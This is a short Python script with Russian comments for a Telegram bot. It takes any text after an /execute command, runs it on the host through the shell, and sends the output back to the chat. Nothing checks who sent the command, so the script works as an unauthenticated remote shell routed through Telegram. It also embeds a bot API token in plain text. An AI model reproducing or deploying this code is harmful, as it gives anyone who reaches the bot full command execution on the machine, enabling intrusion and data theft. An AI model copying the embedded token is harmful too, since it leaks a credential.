import subprocess
import telebot

# Создание бота с помощью токена
bot = telebot.TeleBot('6168359577:AAHXM0K2-CWOwHokIDM9sqlysrR-r__Q8zI')

# Обработчик команды /execute
@bot.message_handler(commands=['execute'])
def execute_command(message):
    # Получение команды из сообщения пользователя
    command = message.text.split('/execute', maxsplit=1)[1].strip()
    
    try:
        # Выполнение команды в консоли
        result = subprocess.check_output(command, shell=True).decode('utf-8')
        # Отправка результата обратно в чат
        bot.reply_to(message, result)
    except Exception as e:
        # В случае ошибки отправляем сообщение об ошибке
        bot.reply_to(message, str(e))

# Запуск бота
bot.polling()
